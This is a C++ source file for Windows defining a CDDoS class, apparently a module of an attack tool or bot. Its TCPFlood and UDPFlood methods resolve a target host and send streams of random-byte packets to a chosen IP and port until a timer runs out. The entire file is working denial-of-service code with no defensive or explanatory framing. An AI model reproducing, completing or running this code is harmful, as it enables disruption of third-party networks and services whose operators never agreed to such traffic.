#include <string>
#include <windows.h>
#include "DDoS.hpp"
#include <time.h>

CDDoS::CDDoS(std::string strTargetIP, int iPort, int nType, long lTick)
{
	m_strTargetIP = strTargetIP;
	m_iPort = iPort;
	m_nType = nType;
	m_lTick = lTick;

	Initialize();
}

CDDoS::~CDDoS()
{
	UnInitialize();
}

void CDDoS::Initialize()
{

}

void CDDoS::UnInitialize()
{
	m_nType = -1;
	m_lTick = 0;
}

void CDDoS::Excution()
{
	if (m_nType == 0)
	{
		TCPFlood();
	}
	else if (m_nType == 1)
	{
		UDPFlood();
	}
}

DWORD CDDoS::Resolve(char *pszIP)
{
	long i;
	struct hostent *hHostent;

	if ((i = inet_addr(pszIP)) < 0)
	{
		if ((hHostent = (struct hostent *)gethostbyname(pszIP)) == NULL)//if((he=(struct hostent*)Ggethostbyname(host))==NULL)
		{
			return(0);
		}
		else
		{
			return(*(unsigned long *)hHostent->h_addr);
		}
	}

	return(i);
}

void CDDoS::TCPFlood()
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2, 2), &WSAData);


	SOCKADDR_IN hSockAddress;
	SOCKET	hSocket;

	memset(&hSockAddress, 0, sizeof(hSockAddress));
	hSockAddress.sin_family = AF_INET;
	hSockAddress.sin_port = htons(m_iPort);
	hSockAddress.sin_addr.S_un.S_addr = Resolve((char *)m_strTargetIP.c_str());

	hSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connect(hSocket, (SOCKADDR *)&hSockAddress, sizeof(hSockAddress)) == SOCKET_ERROR)
	{
		closesocket(hSocket);
		return;
	}

	char szSendData[FLOODSIZE];

	srand(time(NULL));

	for (int i = 0; i < FLOODSIZE; i++)
	{
		szSendData[i] = rand() % 256;
	}

	DWORD ulTick = GetTickCount64() + m_lTick;

	while (ulTick >= GetTickCount64())
	{
		send(hSocket, szSendData, FLOODSIZE, 0);
		Sleep(10);
	};
}

void CDDoS::UDPFlood()
{
	char szSendData[FLOODSIZE];

	srand(time(NULL));

	for (int i = 0; i < FLOODSIZE; i++)
	{
		szSendData[i] = rand() % 256;
	}

	SOCKADDR_IN hUDPAddress;

	hUDPAddress.sin_family = AF_INET;
	hUDPAddress.sin_addr.s_addr = Resolve((char *)m_strTargetIP.c_str());
	hUDPAddress.sin_port = htons(m_iPort);

	SOCKET hSocket = socket(AF_INET, SOCK_DGRAM, 0);

	int nZero = 0;
	setsockopt(hSocket, SOL_SOCKET, SO_SNDBUF, (char *)&nZero, sizeof(nZero));

	DWORD ulTick = GetTickCount64() + m_lTick;

	while (ulTick >= GetTickCount64())
	{
		for (int i = 0; i < 18; i++)
		{
			sendto(hSocket, szSendData, FLOODSIZE, 0, (SOCKADDR *)&hUDPAddress, sizeof(hUDPAddress));
		}

		Sleep(20);
	}
}
